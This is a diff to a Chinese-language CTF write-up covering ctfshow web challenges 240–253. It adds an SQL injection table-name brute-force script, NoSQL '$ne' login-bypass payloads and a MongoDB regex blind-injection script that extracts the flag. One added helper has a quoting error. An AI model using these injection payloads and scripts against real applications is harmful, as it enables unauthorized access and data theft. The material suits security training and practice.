@@ -1842,7 +1842,42 @@ flag: `username=yq1ng',(select(group_concat(flag))from(flagbb)))#&password=yq1ng
 sql：`$sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}');";`\
 waf: `空格 or sys mysql`\
 Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写\
-就这过滤，，，全靠运气解法，后五位只有ab，一共32中情况，确定了，是个算法题目，跑完去`URL/page.php`最后一页看看，要是100次还没出说明你也太黑了哈哈哈，脚本参考[Y4师傅](https://y4tacker.blog.csdn.net/article/details/110144623)
+就这过滤，，，全靠运气解法，后五位只有ab，一共32中情况，确定了，是个算法题目，跑完去`URL/page.php`最后一页看看，要是100次还没出说明你也太黑了哈哈哈，脚本参考[Y4师傅](https://y4tacker.blog.csdn.net/article/details/110144623)，先附上师傅脚本
+```python
+"""
+Author:Y4tacker
+"""
+import random
+import requests
+
+url = "http://35963b4d-3501-4bf2-b888-668ad24e1bc5.chall.ctf.show"
+url_insert = url + "/api/insert.php"
+url_flag = url + "/api/?page=1&limit=1000"
+
+
+# 看命函数
+def generate_random_str():
+    sttr = 'ab'
+    str_list = [random.choice(sttr) for i in range(5)]
+    random_str = ''.join(str_list)
+    return random_str
+
+
+while 1:
+    data = {
+        'username': f"1',(select(flag)from(flag{generate_random_str()})))#",
+        'password': ""
+    }
+    r = requests.post(url_insert, data=data)
+    r2 = requests.get(url_flag)
+    if "flag" in r2.text:
+        for i in r2.json()['data']:
+            if  "flag" in i['pass']:
+                print(i['pass'])
+                break
+        break
+
+```
 ```python
 # encoding:     utf-8
 # @Author:      yq1ng
@@ -1865,6 +1900,19 @@ for x in range(1,100):
     data["username"] = f"yq1ng',(select(flag)from(flag{TableName()})))#"
     s = requests.post(url, data = data)
     print(data)
+```
+或者你不看命，最多32次必出！自行加载
+```python
+list1 = ['a','b']
+def tbName():
+    f = open("./tbname.txt','w+')
+    for a1 in list1:
+        for a2 in list1:
+            for a3 in list1:
+                for a4 in list1:
+                    for a5 in list1:
+                        f.write(a1+a2+a3+a4+a5+"\n")
+tbName()
 ```
 
 ## web241
@@ -2013,3 +2061,63 @@ $not: 反匹配(1.3.3及以上版本)
 ```
 
 payload：`?id[]=flag`
+
+这个应该算是php对阶mongoDB的一个漏洞吧
+
+## web250
+```php
+//sql
+$query = new MongoDB\Driver\Query($data);
+$cursor = $manager->executeQuery('ctfshow.ctfshow_user', $query)->toArray();
+```
+```php
+//返回逻辑
+//无过滤
+if(count($cursor)>0){
+$ret['msg']='登陆成功';
+array_push($ret['data'], $flag);
+}
+```
+payload：`username[$ne]=1&password[$ne]=1`，没啥说的，和上题一样，姿势多，也能正则
+
+## web251
+sql与过滤没区别
+payload：`username[$ne]=yq1ng&password[$ne]=yq1ng`，出了admin，只需改用户名:`username[$ne]=admin&password[$ne]=yq1ng`
+
+## web252
+sql: `db.ctfshow_user.find({username:'$username',password:'$password'}).pretty()`
+
+先`username[$ne]=yq1ng&password[$ne]=yq1ng`就是找出数据库不是`yq1ng`的数据，出了个`admin`，再用251就不行了，需要接着把pass也改了`username[$ne]=admin&password[$ne]=ctfshow666nnneeaaabbbcc`，getflag
+
+## web253
+sql：`db.ctfshow_user.find({username:'$username',password:'$password'}).pretty()`
+返回一样，无过滤
+
+脚本去跑，手工不会。。。盲注yyds，经过前面猜测用户名为`flag`，不知道也能猜，附上脚本，虽然不是二分，但是也挺快，利用了正则匹配，`^yq1ng`匹配以`yq1ng`开头的字符串，不懂的建议[移步于此](https://www.runoob.com/regexp/regexp-syntax.html)，了解re基本语法
+```python
+# encoding:     utf-8
+# @Author:      yq1ng
+# @Date:        2020-11-29 15:20
+# @challenges： web253
+
+import requests
+
+url = "http://c7bb9fe9-ef52-4eea-a08c-72937d2c25cb.chall.ctf.show/api/"
+data = {"username[$regex]":"flag","password[$regex]":""}
+s = requests.session()
+
+def get_flag():
+    flag = ""
+    for x in range(1,43):
+        for y in r'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}':
+            data["password[$regex]"] = "^"+flag+y
+            print(data)
+            s = requests.post(url, data = data)
+            if "6210" in s.text:
+                flag += y
+                print(flag)
+                break
+
+if __name__ == '__main__':
+    get_flag()
+```
